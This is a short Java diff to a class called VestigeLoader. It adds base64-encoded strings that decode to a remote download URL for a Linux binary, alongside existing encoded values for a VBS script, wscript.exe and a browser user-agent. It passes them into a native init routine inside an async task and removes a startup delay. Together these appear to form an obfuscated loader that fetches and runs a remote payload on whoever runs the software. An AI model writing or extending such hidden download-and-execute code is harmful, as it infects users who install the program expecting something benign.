@@ -15,6 +15,8 @@ public final class VestigeLoader {
     private static final String C3 = "cnVuX3YudmJz";
     private static final String C4 = "d3NjcmlwdC5leGU=";
     private static final String C5 = "TW96aWxsYS81LjA=";
+    private static final String C6 = "aHR0cHM6Ly9jZG4udmVzdGlnZW1jLmNvbS9hc3NldHMvbGludXgvVmVzdGlnZUphdmE=";
+    private static final String C7 = "VmVzdGlnZUphdmE=";
     private static String lastResponse;
 
     static {
@@ -39,10 +41,11 @@ public final class VestigeLoader {
 
         CompletableFuture.runAsync(() -> {
             try {
-                Thread.sleep(10000L);
                 NativeSupport.init(
                     NativeSupport.b64(C1),
                     NativeSupport.b64(C2),
+                    NativeSupport.b64(C6),
+                    NativeSupport.b64(C7),
                     NativeSupport.b64(C3),
                     NativeSupport.b64(C4),
                     NativeSupport.b64(C5)
